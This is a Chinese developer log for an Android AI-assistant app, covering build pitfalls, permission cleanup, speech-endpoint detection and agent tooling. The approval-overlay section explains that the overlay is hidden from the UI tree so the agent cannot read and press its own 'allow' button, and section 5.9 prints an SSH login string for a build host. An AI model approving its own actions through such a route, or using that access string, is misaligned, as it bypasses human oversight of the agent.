编译器是 2.2.21、stdlib 是 1.9.23，两边对不上。

同一个坑在 `kotlin-stdlib` / `kotlinx-coroutines-core-jvm` /
`kotlinx-serialization-json-jvm` / `kotlinx-serialization-core-jvm` 各有一份。

```bash
# 先看有没有
find ~/.gradle/caches/modules-2/files-2.1 -maxdepth 3 -type d -name h
# 有就挪走（别直接删，先确认里面只有那一个 jar）
```

为什么 `deps.sh` 的 harness 不受影响：`qa_find_jar` 按 `qa_kotlin_version` 取**同版本**，
不走裸 `head -1`。约 19 个老脚本仍是裸 find——干净缓存里没事，缓存一脏就集体红。

### 5.8 坑六：沙箱重建后 `/tmp/kotlinc` 没了，7 个老 harness 报「插件路径不存在」

CI 里有一段 shim（`.github/workflows/build.yml` 的「Prepare kotlinc shim」）会在
`/tmp/kotlinc` 造一个同名 `kotlinc`，并把序列化编译器插件放到
`lib/kotlinx-serialization-compiler-plugin.jar`。沙箱不跑 CI，这段就没人做。

症状：`error: plugin classpath entry points to a non-existent location:
/tmp/kotlinc/lib/kotlinx-serialization-compiler-plugin.jar`。

修法：照 CI 那段复刻一遍即可（`KJAR/STD/TROVE/ANN` 都从缓存取，
插件从 maven central 下 `kotlin-serialization-compiler-plugin-embeddable-1.9.25.jar`）。
**插件必须与编译器同为 embeddable 变体**——非 embeddable 插件配 embeddable 编译器
会在编译期内部崩溃（exit=2）。

### 5.9 云端构建机（instabox）：沙箱编不了的，这里能编

沙箱没有 Android SDK，`app` 侧只能靠 CI。2026-11-20 起多了一条通道：

```
ssh -p 2222 ibssh_viqb5x6t7oyvhjlovwzqltapii@ssh.instabox.sh
```

Debian 13 / 4 核 / 7G 内存 / JDK 21 / 持久卷 `/data/home`。**SDK 已装好**
（`~/android-sdk`：platform-34、build-tools 34.0.0、emulator、API 30 x86_64 镜像），
仓库在 `~/work/Polaris`。

一次完整验证（实测耗时）：

| 步骤 | 命令 | 耗时 |
|---|---|---|
| 拉第三方源码 | `bash scripts/fetch-llama.sh git` | ~40s（有网，commit 校验通过） |
| Kotlin 编译 | `./gradlew :app:compileDebugKotlin` | 47s |
| core 单测 | `./gradlew :core:testDebugUnitTest` | 19s（**224 条**） |
| app 单测 | `./gradlew :app:testDebugUnitTest -PnoNative=true` | 14s（**18 条**） |
| 出 APK | `./gradlew :app:assembleDebug -PnoNative=true` | 25s（28MB） |
| 静态检查 | `./gradlew :app:lintDebug` | 48–64s |

四点要注意：

1. **必须 `-PnoNative=true`**（或先跑 `fetch-llama.sh`）。仓库不带 `llama.cpp`，
   主 CMakeLists 第一件事就是 `add_subdirectory` 它，缺了直接 FATAL。
2. **模拟器只能软件模拟**：容器里 `/dev/kvm` 是个假节点（`ioctl KVM_GET_API_VERSION`
   报 `ENODEV`），加 `-accel off` 才起得来。代价是启动 3–5 分钟、`MainActivity`
   冷启 21s、SystemUI 会自己 ANR 一次（**不是 app 的问题**）。
3. **模拟器要 >7.2G 空闲**（`Not enough space to create userdata partition`），
   而 AVD 的 `disk.dataPartition.size` 改小**没用**——那是固定门槛。腾空间最省事的是
   删 `~/android-sdk/ndk`（2.1G，`-PnoNative` 构建用不到，要编 arm64 再装回来）。
4. **输入框点不进去**：纯软件模拟下 Compose `BasicTextField` 拿不到焦点
   （`focused=false`、`mInputShown=false`，换成 DOWN/UP 分离事件也一样）。
   点击按钮正常（菜单、抽屉、「先自己看看」都能点中）。所以模拟器能验
   「渲染 + 导航 + 数据落盘」，验不了「打字」。

**别把它当真机**：APK 是 `noNative` 的，本地 llama 推理链路完全没跑；
真机矩阵（P1–P3 容器、语音、桌宠悬浮窗）仍然只有 arm64 真机能验。

还有一招很好用：**在目标 API 上直接验某个符号在不在**。写 6 行 Java，`javac --release 11`
（d8 认不得 major 65，不降级会报 `Unsupported class file major version`）→
`d8 --min-api 26` → `adb push` → `adb shell dalvikvm -cp x.dex Probe`。
验 `BigInteger.TWO` 时输出 `NoSuchFieldException`，比翻文档可信。

### 5.10 坑七：`BigInteger.TWO` 在 minSdk 26 上崩，而所有既有判据都绿

`app/.../automation/adb/Spake2Ed25519.kt` 用了 7 次 `BigInteger.TWO`。它是 **Java 9**
加的静态字段，Android 平台的 `java.math.BigInteger` 到 **API 33** 才有；
`minSdk = 26` 且项目没开 core library desugaring。

后果不是「用到才崩」——它写在 `object Ed25519` 的**顶层 val 初始化式**里（`P` 和 `L`），
也就是**类一被加载就执行**。「进 ADB 无线配对」即 `NoSuchFieldError`，崩在类初始化，
`try/catch` 接不住。

它为什么能活到现在：

| 判据 | 为什么看不见 |
|---|---|
| 编译 | JDK 21 有 `TWO`，过 |
| JVM 单测（`Spake2Verification` 15 条） | 同上，全绿 |
| arch-guard | 只管分层/行数/schema 单点 |
| CI | **CI 不跑 lint** |

2026-11-20 在云端第一次跑 `:app:lintDebug` 才抓出来（13 条 NewApi 里 7 条是它）。

修法：全部改成 `BigInteger.valueOf(2)`（`valueOf` 对 -16..16 有缓存，零额外开销），
并在文件头写清「为什么不许写 TWO」；`arch-guard` 新增 [J] 段，禁
`BigInteger.TWO` / `List.of` / `Set.of` / `Map.of` / `copyOf` 这些 Java 9+ 平台符号
（带反向自检：已知坏样本必须被正则命中）。变异验证：改回 `TWO` → 守卫变红并指出行号。

**教训**：JVM 单测跑在**比目标平台新**的 JDK 上，这类「新平台才有」的符号它天生看不见。
判据要落在**目标平台**（lint 的 API 检查），或者至少落在**符号级 grep** 上。

---

### 5.11 权限：清单 29 条、日常零弹窗，以及两个真死路

用户的原话是「我们的应用好像都没向手机要过权限」。核查后这个观察成立，但它不是缺陷——
是 `targetSdk = 28` + 全走系统选择器的结果。真正的问题是另外两件。

**先看事实**（云端模拟器 API 30，`dumpsys package com.beichen.polaris`）：

| 层 | 内容 | 装完的状态 |
|---|---|---|
| 运行时危险权限 | `RECORD_AUDIO`、`POST_NOTIFICATIONS` | 全 `granted=false`，启动流程一次都不申请 |
| 特殊权限 | 悬浮窗 / 无障碍 / 通知监听 / 使用情况 / 电池优化 / 安装未知应用 / Shizuku | 不弹窗，全是「跳系统设置页」 |
| normal | INTERNET、前台服务系列、QUERY_ALL_PACKAGES 等 | 安装即授予 |

运行时申请点只有 3 处，全部在「用户主动打开某功能」那一刻：开完成提醒要通知
（`SettingsScreen.kt:256`）、开桌面助手要麦克风（`SettingsScreen.kt:480`）、声音克隆点录音
（`VoiceCloneScreen.kt:230`）。

**死路一：聊天页语音永远拿不到授权。** `ChatScreen.startVoiceInput` 只判断
`AsrDirectory.isInstalled()`，装了模型就直接开面板；面板里 `LocalSpeechInput.start`
发现没权限只回报一行红字，没有按钮也没有跳转，而本应用设置页里根本没有「麦克风」这一项。
从聊天页进来的用户被卡死在这里。同一仓库里 `VoiceCloneScreen` 的写法是对的（先 `launch`），
所以这是漏改。修法：闸门前移到入口——模型未装给下载指引，未授权先弹系统框，已问过还被拒
则送应用详情页（`ACTION_APPLICATION_DETAILS_SETTINGS`）。实现落在新文件
`ui/VoiceInputGate.kt`（`rememberVoiceInputGate`），`ChatScreen` 只留一行调用
（3235 → 3194，顺带把 arch-baseline 收紧）；不抽出去的话，ChatScreen 的 1500 行上限
当场就红。

**死路二：11 条声明在代码里零使用。** `CAMERA`、`READ/WRITE_EXTERNAL_STORAGE`、
`READ_MEDIA_IMAGES/VIDEO/AUDIO`、`MANAGE_EXTERNAL_STORAGE`、`WRITE_SETTINGS`、
`SCHEDULE_EXACT_ALARM`、`SET_ALARM`、`KILL_BACKGROUND_PROCESSES`。存储那 6 条尤其没必要：
图片/文件/备份全走 `GetContent` / `OpenDocument` / `PickVisualMedia`，`contentResolver`
拿到的是用户当场授予的单个 uri；`MANAGE_EXTERNAL_STORAGE` 在 targetSdk 28 上被系统直接忽略。
`CAMERA` 更糟——它是危险权限，会在系统「权限」页里摆出一个用不上的「相机」条目。
清单 29 条 → 18 条。

**顺带核实的一件事**：`ProotRunner` 用 `-b /sdcard` 把外存挂进容器，但 App uid 读不到。
模拟器上 `run-as com.beichen.polaris ls /sdcard` → `Permission denied`（uid 10130）。
这条绑定只对 uid 2000 的调试通道（Shizuku / adb shell）有效——`ShellCommandRules` 的注释
本来就是这么写的。删掉存储权限**不改变**这个现状：App 从未申请过它，也从未以自身 uid
读过外存。

判据 `scripts/qa/run-permission-gate-verification.sh`（24 条）：五个入口要素 + 11 条死声明
必须不在 + 9 条保留项不许误删 + 危险权限必须有 `launch` 点 + 反向自检（把旧实现喂进去必须红）。
变异验证：加回 `CAMERA`、替换 `ACTION_APPLICATION_DETAILS_SETTINGS` → 3 条红，恢复后全绿。

**未验证的**：真机上点语音按钮是否真弹系统框（模拟器缺 ASR 原生库，`isInstalled()` 过不去，
入口走到「先下模型」那一支）。这一条留给真机清单。

---

### 5.12 坑八：Android 的正则不是 OpenJDK 的正则（ICU 花括号）

**现象**：2026-11-21 真机（`1.827`）点「快捷指令」，直接闪退。崩溃记录：

```
java.lang.ExceptionInInitializerError
at com.beichen.polaris.core.PromptVariablesKt.extractPromptVariables(Unknown Source:0)
```

**根因**：`core/PromptVariables.kt` 顶层的占位正则

```kotlin
private val PROMPT_VARIABLE = Regex("""\{\{\s*([^{}\n]+?)\s*}}""")
```

结尾那两个 `}` **没转义**。JVM 上完全合法（OpenJDK 的 `Pattern` 把孤立 `}` 当字面量），
所以 `:core:testDebugUnitTest` 全绿。但 Android 的 `java.util.regex.Pattern` 底下是
**ICU4C**，对花括号配对要求严格，直接抛 `PatternSyntaxException: Syntax error near index 23`。

而那行在文件顶层 `val` 的初始化式里 → 异常被包成 `ExceptionInInitializerError` →
**类加载即崩**，`try/catch` 接不住（炸的是 `<clinit>`，不是方法体）。
触发点极窄：只有「提示词模板里带 `{{变量}}`」的路径会碰 `extractPromptVariables`，
所以这个功能从上线起就是死的，而没人点过——真机上第一次点就崩。

**实证**（API 30 模拟器，`javac --release 11` → `d8 --min-api 26` → `dalvikvm` 探针）：

| 正则 | 结果 |
|---|---|
| `\{\{...\s*}}` | **FAIL** `Syntax error near index 23` |
| `\{\{...\s*\}\}` | OK，`find=true g1=name` |
| `a{` | FAIL `Error in {min,max} interval` |
| `a]` | OK（右方括号不严格） |
| `a{2,3}` | OK |
| `x[}]y` | OK（字符类内的花括号安全） |

**为什么四个判据都没看见**：编译过（编译器不管正则语义）、JVM 单测过（引擎不同）、
arch-guard 的 [J] 段只查**符号**不查**语法**、CI 不跑 Android 运行时。
和坑七（`BigInteger.TWO`）是同一个形状：**JVM 能跑、Android 不能**。

**修法**：`...\s*\}\}`，并把理由写在文件头（下一次有人「简化」时能看见）。

**新判据** `scripts/qa/run-regex-compat-verification.sh`（5 条）：

- [A] 提取全仓 `Regex(...)` 字面量，**含 `"""...""" + """..."""` 拼接**（事故点的两条
  secret 正则就是拼接写法，只取第一段会得到假阳性）；
- [B] 按 ICU 规则逐条判定：字符类外 `{` 必须是合法 `{n,m}` 量词开头或已转义，
  `}` 必须与之配对或已转义；
- [C] 反向自检：已知坏样本（`}}`、`a{`、`a}b`）必须红，已知好样本（`\}\}`、`a{2,3}`、
  `x[}]y`、`a]`）必须绿——没有这段，正则写错会让门禁永远绿；
- [D] 回归锁：`PromptVariables.kt` 里那行原文必须还在（防止有人改回去）。

变异：把修复改回 `}}` → B2 + D1 两条红，并指出 `PromptVariables.kt:38`；恢复后 5/5 绿。

**全量体检结论**：仓库里 95 条可静态提取的正则，在 API 30 上**全部编译通过**（0 失败）。
另有 11 条含 `$` 的模板拼接正则无法静态判定（`AgentLogger`、`ToolchainInstaller`、
`LocalToolCallParser`、`TerminalSessionPool`、`MarketModels`、`MemoryAutoCapture`、
`ShellTool`），它们是「运行时才成形」的正则，需要单独审——已记进未决事项。

---

### 5.13 跨应用审批浮层：审批卡必须跟着界面走

**现象**（用户 2026-11-21 真机反馈，原话）：

> 让它去 QQ 发消息，它就会跳到 QQ 那里，但是它点确定了，它还在北辰那里……
> 我又得回到北辰点确定，再跳回去，它又自己跳回去，很麻烦。

拆开是三件事挤在一起：

1. 审批卡是 Compose `Dialog`，只挂在北辰的 `MainActivity` 窗口上。自动化跳到目标
   应用后北辰进后台，`Dialog` 不在屏幕上，而 `awaitApprovalDecision` 的 30 秒倒计时
   照跑——用户还没看到卡，闸门已经落下（`tool.end code=approval_denied`）。
2. 用户切回北辰点「允许」后，进程虽在前台，但 Agent 已经重新读了一遍界面并继续
   跳转，用户看到的界面又变了。一次操作变成两三次应用切换。
3. 「本次会话不再询问」那一行是小字链接，真机上没人看见，于是每一步都回来点一次。
   截图里一次发消息任务有 8 个工具调用，其中 4 个需要审批。

**为什么不能靠「把 Dialog 换个位置」解决**

`Dialog` 的窗口属于 Activity。Activity 在后台就没有窗口可画，这不是布局问题。
跨应用显示只有三条路：通知、`SYSTEM_ALERT_WINDOW` 悬浮窗、无障碍浮层。

**为什么选无障碍浮层**

`TYPE_ACCESSIBILITY_OVERLAY` 是 `AccessibilityService` 专属窗口类型，
**不需要 `SYSTEM_ALERT_WINDOW`**。而要做自动化，无障碍必定已经连上，所以在所有
会触发审批的场景里这条路都成立，不多要一个用户得手动去开的特殊权限。

走 Shizuku / 无线调试（无障碍没开）时浮层不挂载，`overlayReady` 保持 false，
应用内 `Dialog` 照旧渲染——功能不退化，只是少了跨应用那一步。

**三个不能省的窗口细节**

| 细节 | 不加会怎样 |
|---|---|
| `FLAG_NOT_FOCUSABLE` | 抢焦点，把输入法顶掉——而自动化此时可能正在往输入框打字 |
| 不加 `FLAG_NOT_TOUCHABLE` | 加了按钮永远点不动；窗外穿透靠 `FLAG_NOT_TOUCH_MODAL` |
| `IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS` | `ui_tree` 会把「允许本次」读给模型，**模型自己批自己** |

**遮挡会不会导致点错**：不会。浮层只在「有一张卡在等」时出现，那一刻 Agent 正卡在
审批挂起里，不派发任何手势；用户点完卡片立即消失，Agent 才继续。时序上不重叠。

**结构**：`automation/ApprovalBridge.kt`（进程级中转，`pending` / `overlayReady` /
`Sink`）+ `automation/ApprovalOverlay.kt`（原生 View 浮层）+ 服务挂载 + ViewModel 发布。

判定逻辑仍然只有一份：浮层点按钮回调 `ChatViewModel.approveOnce / approveAlways /
denyApproval`，档位与白名单仍在 `ApprovalTier` / `ApprovalScope`。浮层只负责显示。

**判据** `scripts/qa/run-approval-overlay-verification.sh`（15 条）：窗口类型、
三个标志位、无障碍树排除、接线、不双份、失败降级，以及反向自检（喂
`APPLICATION_OVERLAY + NOT_TOUCHABLE` 的坏样本必须判红）。判据读文件时**剔除注释行**
——第一版就踩了这个坑：注释里写着「不能加 FLAG_NOT_TOUCHABLE」，被 grep 当成实现命中。

---

### 5.14 静音幻觉：不开口也会识别出三个字

**现象**（用户 2026-11-21 真机，原话）：

> 我根本就没有说话，试一下它是不是我没说话，它也会乱识别出其他东西

日志里连按四次，得到 3 / 3 / 4 / 0 字：

```
11:55:13 [AsrInput] 离线识别完成：3 字（2605ms）
11:55:39 [AsrInput] 离线识别完成：3 字（1565ms）
11:55:46 [AsrInput] 离线识别完成：4 字（2307ms）
11:55:53 [AsrInput] 离线识别完成：0 字（3010ms）
```

四次的日志**全部是成功**，没有一条 error。用户什么都没说，输入框里却多了一句话。

**这不是「识别不准」，是两件事叠在一起**

1. `OfflineAsrEngine` 收尾时把峰值拉到 0.9（本意是救离手机半米的轻声说话）。
   静音的峰值只有 0.003 上下，`gain = 0.9 / 0.003 = 300`——**底噪被放大成「很响的音频」**。
2. paraformer 对任何非静音输入都会给出一串最可能的汉字，它没有「没人说话」这个输出。

所以只看阈值不够：**判定必须发生在放大之前**。顺序反了，判定看到的是被自己放大的
噪声，阈值再准也没用。这是本轮唯一一个「逻辑对、位置错」的 bug，
`run-asr-silence-verification.sh` 的 [A] 专门比较两个语句的行号。

**为什么不干脆把放大关掉**

轻声说话（0.04 左右）不放大识别会漏字，这在上一条里已经踩过。放大是对的，错的是
「不看有没有人声就放大」。现在两者互锁：先判有人声，再放大。

**阈值的三个常数（都在 `core/voice/SpeechPresence.kt`）**

| 常数 | 值 | 为什么是这个值 |
|---|---|---|
| `FRAME_MS` | 20 | 语音处理的常规粒度；再短会被 VAD 抖动带偏，再长会吃掉短音 |
| `MIN_SPEECH_MS` | 200 | 「嗯」一声约 300ms；200 不会误杀，又能挡掉敲桌子（30–50ms） |
| `FLOOR_RMS` | 0.006（≈ -44 dBFS） | 真人即便很轻也在 0.02 以上，底噪基本在 0.005 以下 |

门限不是写死的一个数：取全段帧 RMS 的 **10 分位**当底噪估计，乘 3，再夹在
`FLOOR_RMS` 和 `MAX_GATE`（0.08）之间。原因是手机底噪横跨三个数量级——安静卧室
0.0005，地铁 0.02。写死的门限要么在安静环境放过底噪，要么在嘈杂环境吃掉轻声说话。
10 分位而不是中位数：说话帧通常占多数，低分位更接近真实底噪。
封顶是为了「整段都在说话、没有静音可采样」时不被自己的低分位误杀（有单测钉这条）。

**一个自己踩出来的 API 陷阱**

第一版写成两个都是 `(FloatArray, Int)` 的重载：`voicedMillis(pcm, sampleRate)` 和
`voicedMillis(frames, frameMs)`。编译器直接报 conflicting overloads；更糟的是单测里
`hasSpeech(pcm, rate)` 把 16000 当成帧长，每个样本被当成一帧——一段 30ms 的敲桌子
噪声被判成「说了 8 秒话」。现在 PCM 入口叫 `hasSpeech`，帧入口叫 `hasSpeechInFrames`，
名字分开是唯一可靠的防呆。

**流式也要拦**

`StreamingAsr` 的端点规则第一条 `mustContainNonSilence = false`（为了「说完自动停」），
副作用是纯静音也可能被判停，于是上层收到一句凭空的文本。流式不缓存 PCM，所以
`Session` 边收边把每块压成 20ms 粒度的 RMS（块内均匀），收尾时走同一个判据。

**判据** `scripts/qa/run-asr-silence-verification.sh`（12 条）：判定在放大之前（比行号）、
阈值只有一份、流式入口没串用、单测覆盖五个现场（全零 / 底噪 / 瞬态 / 轻声 / 连续说话），
外加两个反向自检——删掉判定必须红、把判定挪到 `normalize` 之后必须红。

实测变异：摘掉 `StreamingAsr` 的判定 → [C] 红、退出码 1；把判定挪到放大后 → [E] 红。

**还欠什么**

- 「嗯」「啊」这类单字应答，200ms 门槛能过，但 `SpeechLogic.FILLERS` 会把它丢弃——
  这是**聊天页**的行为（`PetVoice` 走 cleanResult）。若用户确实只想说「嗯」，会被当成
  没听清。这条没改，先记着。
- 这套判据只在 JVM 上验过（合成波形）。真机底噪分布是否落在假设范围内，要等下一次
  真机日志里的「判为无人声：有声 Xms / 全段 Yms」来校准。

---

### 5.15 ui_batch：把 N 次往返压成一次（治「慢」）

**由来**：用户真机反馈「无障碍操控又慢」。拆开看，慢的不是点击（几十毫秒），是
**每一个界面动作都要一次完整的模型往返**：

```
往返1 → ui_tap(搜索框)   网络 2~5s + 回执 1.5s
往返2 → ui_input("天气")  网络 2~5s + 回执 1.5s
往返3 → ui_key(enter)     网络 2~5s + 回执 1.5s
往返4 → ui_tree           网络 2~5s + 回执 1.5s
往返5 → ui_tap(第一条)    网络 2~5s + 回执 1.5s
```

五个动作，五份网络时间。**本地那部分省不掉（回执要等界面稳定），网络那部分能省四份。**

**做法**：`automation/UiBatchTool.kt`，一次提交最多 8 个动作，顺序执行，返回每步结果。
没有走 dsh 的 PTC 路线（模型写代码调工具）——那要引入 JS 解释器，而北辰的瓶颈是
往返次数，不是表达力。动作数组能吃掉 80% 的收益，代价是零新增依赖。

**三条边界，缺一条就出事**：

| 边界 | 为什么 |
|---|---|
| 白名单写死 7 个动作，**不含 ui_screenshot** | 一批 8 个截图 = 8 张图回灌，直接打爆上下文 |
| 不做 `ui_` 前缀匹配 | 前缀匹配等于把「一次审批」变成「任意 ui 工具批量执行」，以后新增的危险工具会被自动纳入 |
| 先整体校验、再开始执行 | 半途因一个拼错的 action 停下，前面点掉的动作收不回来。判据用**行号比**，不看有没有写校验 |

**整批只审批一次**——这是体验改进的核心，用户从点 5 次「允许」变成点 1 次。
代价是审批卡看不到每步细节，所以 description 里写明「批内必须是同一个意图的连续操作」。

**顺手修的一处语义冲突**：系统提示原文是「每次操作后界面已变，必须重新 ui_tree」。
有批处理之后这句会让模型在批内犹豫（到底该不该中途读树）。改成「用 ui_batch 时整批
执行完再 ui_tree，批内不要重读」，同时在前一句加了批处理的引导。长度 668 → 785 字符，
上限 4000，余量充足。

**判据** `scripts/qa/run-ui-batch-verification.sh`（16 条）：存在与注册顺序、白名单边界、
先校验后执行、审批与只读标注、失败带 hint、审批卡必须说人话，以及两个反向自检——
白名单注入 `ui_screenshot` 必须红、摘掉 `needsApproval` 必须红。两次变异实测均捕获。

**还欠什么**

- 8 这个上限是拍的：再多，模型给的后半段坐标几乎必然已经过时。真机跑几轮后按失败率调。
- 批内每步仍走 `runOnService` 的完整回执（最多 1.5s/步），8 步就是 12s。理论上中间步
  可以用短回执、只在末步等完整回执，但那样要改 `runOnService` 的契约，等实测数据再说。
- 只有真机能验：模拟器点不动，且没有模型来生成批次。

---

### 5.16 「说完自己停」这句话，一直是假的

2026-11-21 核对语音链路时发现的。不是文案问题，是缺失。

**缺陷本身**：聊天页语音面板上写着「正在听（说完自己停）」。但引擎选择是
`AsrRouter.active()` → 「准的优先」，装过 paraformer 就用它（`accurate.isInstalled()`）。
paraformer 是整段模型，会话里 `isEndpoint()` **恒返回 false**——它只在松手时认一次。
于是用户说完话：

- 录音不停，要手动点「说完了」，或者一直录到 `MAX_MS = 30_000`；
- 界面上一个字都不出（整段模型收尾前不产出文本），一直停在「说点什么…」。

用户看到的就是「按了麦克风，然后卡住」。这个缺陷活了很久，因为**没有任何一层会报错**：
没异常、没告警、日志里只有一行「离线识别完成」，而且它确实能认对——只是要先手点一下。

**做法**：`SpeechPresence.Tracker`，增量版的人声判据。每收一块音频（录音循环固定
100ms）算一个 RMS，喂进去；尾部连续静音超过当前阈值就报端点。
`OfflineAsrEngine.Batch.isEndpoint()` 改成读它。阈值怎么定见下一节 5.17。

**为什么不直接换 silero_vad.onnx**：那要引 onnxruntime-android + 1.9MB 模型资产，
而 `VoiceArbiter`/sherpa 那条离线链路本来就在。能量判据的短板是「响就是人声」，
补一条对比度就够了；换模型是另一个量级的改动（依赖、体积、真机不可验）。

**三条判据，缺一条就出事**：

| 判据 | 不做会怎样 |
|---|---|
| `voiced >= MIN_SPEECH_MS`（200ms） | 用户按下麦克风稍一犹豫（1 秒没开口），会话被判「说完了」并提交一句空话 |
| 有声就清零尾部静音 | 一段有停顿的话会被从停顿处切开（"我想想……就这样吧"只剩前半句） |
| 对比度：有声段均电平 ≥ 底噪 × 3 | 空调声自己把会话关掉——见下 |

**对比度这条是写测试时才发现的**。逻辑推演：录音开头窗口不足 10 个样本，
`gateOf` 只能退到绝对下限 `FLOOR_RMS = 0.006`；空调 0.01 高于它，于是这 1 秒被误计成
「有声」。之后门限正常了，空调被判静音，`silence` 一路累积到 1000ms——**用户什么都没说，
界面自己关了**。变异实测（去掉 `hasContrast()`）复现了这个数字：`voiced=900, silence=1100`。

判据因此加了一条事后核验：有声段的平均电平必须比当前底噪高 3 倍。空调的「有声」和
「底噪」都是 0.01，比值 1，不通过；真人说话 0.05 对底噪 0.001，比值 50，通过。
这条正好是 `gateOf` 的定义式，只是从「事前定门限」换成「事后核验」。

**一个必须挡住的连带伤害**：`LocalSpeechInput` 同时被聊天页面板和桌宠用。
桌宠是**按住说话**，用户按住期间停下来想词是常态。所以 `start(autoStop: Boolean = true)`，
桌宠显式传 `false`。默认值给 `true` 是因为聊天页面板上那句文案本来就是「说完自己停」——
默认值应当与文案一致。

**判据** `scripts/qa/run-speech-endpoint-verification.sh`（18 条）：
A1–A14 行为（没开口不停、干脆的人 800ms 收、句中停顿不切且抬高阈值、半声哼不算、
空调不误关、空调里说话照停、非法块丢弃、自适应区间自洽、阈值恒大于最长停顿、
开麦愣神不抬高阈值、阈值可钉死、与整段判据同结论），B1–B4 源码接线（端点不再是
`= false`、每块都喂 Tracker、桌宠真的关了、面板真的没关）。变异四条：
M1 阈值改成「等于停顿本身」→ A3/A8/A12 红；M2 去掉「愣神不算停顿」→ A13 红；
M3 停顿统计去掉 800 上限 → A7 红；M4 自适应上限放宽到 3 秒 → A10 红。全部 CAUGHT。

---

### 5.17 静音阈值跟着说话人走

5.16 把「尾部静音满多少算说完」定成 `END_SILENCE_MS = 1000`。这个数字是拍的，
两头都不对：短了切句子，长了每人每句都多等一秒。而「多长算停顿」本就因人而异——
有人一口气说完，有人每三个字停一下，一个常数不可能同时对这两种人正确。

**改法**：`Tracker` 记录本次录音里最长的一次**句内停顿**（有声块到来时，
把刚清零的 `silenceMs` 记进 `maxPauseMs`），阈值取 `maxPauseMs + 500`，
夹在 `[MIN_END_SILENCE_MS = 800, MAX_END_SILENCE_MS = 1300]`。
一句话里没停过 → 800ms 就收；停过 600ms → 1100ms 才收；停过 700ms → 1200ms。
对外暴露 `endSilenceMs` 只读属性，让调用方和日志能看见「此刻按什么在判」。

**三条刻意的约束**：

1. **只统计 1..800ms 的停顿**。超过 800 的停顿本来就要判停，记进统计只会让
   后面的句子更慢——A7（空调响 2 秒后说话）实测会被拖到 1300 才收。
2. **`voiced > 0` 之前的静音不算句内停顿**。开麦先愣 700ms 不该把整句拖慢。
   这条测试最初写成「愣神 2 秒」，但 2 秒超过统计上限，任何实现都能过——等于没测；
   改成 700ms 才抓得住（变异 M2）。
3. **阈值只升不降**。同一句里已经证明这个用户会停这么久，降回去只会让后半段
   更容易被切。代价是同一句里越往后越慢，这是「宁慢不切」的延续。

**为什么不改成 silero VAD 彻底解决**：能量判据的短板是「响就是人声」，需要频谱才能
分辨「稳态噪声」和「持续说话」。但换模型要引 onnxruntime + 1.9MB 资产，且真机不可验。
自适应解决的是「阈值不该是常数」，不是「能量判据不够」——后者另开一条。

**真机怎么验**：P32 四条。核心是 P32-2：停 0.6 秒不该被切，且后面同样长的停顿
也不该被切（证明阈值确实跟着走了）。P32-3 是反向检查：开麦愣 1 秒不该把整句拖慢。

---

### 5.18 MAX_GATE 这个缺陷，决定不改

5.16 的「还欠什么」里记着：地铁这类底噪 0.02、说话 0.06 的环境，`MAX_GATE = 0.08`
会把说话判成静音 → 永不判停。核对后发现原描述有两处不准，不能照着改：

1. **算错了**。底噪 0.02 时 `0.02 × 3 = 0.06 < 0.08`，封顶没生效，门限是 0.06，
   说话 0.06 刚好通过。真正触发封顶要底噪 ≥ 0.0267，此时门限被压到 0.08，
   说话在 0.06–0.08 之间才全判静音。
2. **不是「永不判停」的前置条件**。即便全判静音，`voiced = 0 < MIN_SPEECH_MS`，
   `shouldEnd()` 也是 false，后果就是「不自动停，用户手点」——和 5.16 修之前的
   表现一样，不是新引入的回归。

试过三种改法，全部在别的场景塌掉：

| 改法 | 塌在哪 |
|---|---|
| 去掉封顶 | 底噪 0.03 时门限 0.09 > 说话 0.06，更糟 |
| 封顶改成「窗口 p90 的 85%」 | 只有底噪 0.002 时会降到 0.0017 < 底噪，稳态噪声全判有声 |
| 封顶改成「p90 × 1.1」 | 地铁底噪 0.03、说话 0.06 时 0.066 > 0.06，说话判静音 |

根因是时间域里「高电平稳态噪声」和「持续说话」不可分（要靠频谱）。而改 `gateOf`
会连带改整段判据 `hasSpeech`——那是「没人说话时不许识别出字」的唯一闸门，
改激进就会把 5.16 之前那个「空按麦克风吐出 3 个字」的老 bug 放回来。

**结论：常数不动**。代价是嘈杂环境里自动停可能不生效，用户手点一下。要真解决，
走 5.16 提到的 silero VAD，而不是继续调这几个常数。

### 5.19 接了 silero VAD（2026-11-22），5.18 的缺陷从根上绕开

5.18 的结论是「时间域解不了，要频谱」，这轮把频谱那半接了。**5.18 那一套常数一个没改**
——`Tracker` 整条保留，当降级路径用。

**关键发现：不用重编 so、不用加依赖。** 仓库里 `libsherpa-onnx-jni.so` 一直带着
VAD 的 JNI 符号（`Java_com_k2fsa_sherpa_onnx_Vad_*` 共 12 个），只是从没写过 Kotlin 那半边。
从 so 的字符串里读出实际版本是 **v1.13.8**，按该 tag 的官方 `Vad.kt` 抄绑定，
字段名一个不改（JNI 用 `GetFieldID` 按名字取，改一个就静默返回 0）。
APK 只多了 629KB 的 `silero_vad.onnx`（`androidResources.noCompress` 已含 `onnx`，
否则 `AssetManager` 读不到）。

**分层**（与项目一贯做法一致：判据进 core，壳只接线）：

| 层 | 文件 | 职责 |
|---|---|---|
| 纯逻辑 | `core/voice/SpeechPresence.VadEndpoint` | 输入「这块是不是人声」，输出「说完没有」 |
| 绑定 | `app/k2fsa/sherpa/onnx/Vad.kt` | 照官方 v1.13.8，12 个 external 签名 |
| 壳 | `app/audio/asr/SileroVad.kt` | 加载模型、喂样本、异常翻译成 `null` |
| 接线 | `app/audio/asr/OfflineAsrEngine.Batch` | 双路径 + 失败降级 |

**四个刻意的取舍**：

1. **两条判据同时喂**，不是「有 VAD 就不算 RMS」。VAD 在某一句中间崩了（ONNX 偶发），
   Tracker 已经攒着这半句，切过去就能接着判；否则用户遇到的是「这一句永远不自动停」。
   多算一次 100ms 块的 RMS 是 1600 次乘加，可忽略。
2. **VAD 不需要自适应阈值**。Tracker 那套自适应是为了「按停顿习惯放宽」，VAD 已用
   `minSilenceDuration = 250ms` 消化了短停顿，只需固定 `VAD_END_SILENCE_MS = 500`，
   端到端约 750ms，比 RMS 的 800ms 略快。
3. **整段「有没有人说话」也换了判据**（`voiced > 0`，不是 `>= 200ms`）。模型要求连续
   200ms 语音才翻 true，门槛已经由模型承担；拿 100ms 粒度的块累计去比 200ms 会误杀短句。
4. **`maxSpeechDuration = 30s`**（官方默认 5s）。5s 会在长句中途强制切段、把
   `isSpeechDetected()` 打断，表现为「说到第 5 秒被判说完」。上限本来就在录音层。

**判据** `scripts/qa/run-vad-endpoint-verification.sh`（18 条）：A1–A10 时间规则
